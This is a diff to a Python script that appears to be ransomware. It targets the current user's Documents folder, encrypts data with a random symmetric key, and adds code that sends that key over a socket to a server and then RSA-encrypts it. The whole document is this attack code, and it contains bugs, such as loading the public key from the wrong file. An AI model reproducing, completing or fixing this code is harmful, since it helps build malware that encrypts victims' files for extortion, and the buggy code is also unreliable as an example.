@@ -4,13 +4,13 @@ from cryptography.hazmat.backends import default_backend
 import os
 import socket
 import getpass
-
+import rsa
 username = getpass.getuser()  # get the username of the current user
 path = "C:/Users/"+username+"/Documents"
 
 
 SERVER_IP = 'localhost'
-SERVER_PORT = 5678
+SERVER_PORT = 11000
 
 # Generate a random key
 key_size = 16  # 128 bits
@@ -50,6 +50,25 @@ with open('encrypted_file.txt', 'wb') as f:
 with open('key.key', 'wb') as f:
     f.write(key)
 
+
+# revive the public key from the server
+with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
+    s.connect((SERVER_IP, SERVER_PORT))
+    thepublickey= s.recv(1024)
+    print(thepublickey)
+    s.send(key)
+# save the public key to a file
+with open('public.pem', 'wb') as f:
+    f.write(thepublickey)
+# ENCRYPT THE KEY.KEY FILE USING THE PUBLIC KEY using rsa lib
+with open('key.key', 'rb') as f:
+    public_key = rsa.PublicKey.load_pkcs1(f.read())
+    print(public_key)
+    encrypted_key = rsa.encrypt(key, public_key)
+    print(encrypted_key)
+    # save the encrypted key to a file
+    with open('encrypted_key.key', 'wb') as f:
+        f.write(encrypted_key)
 
 
 
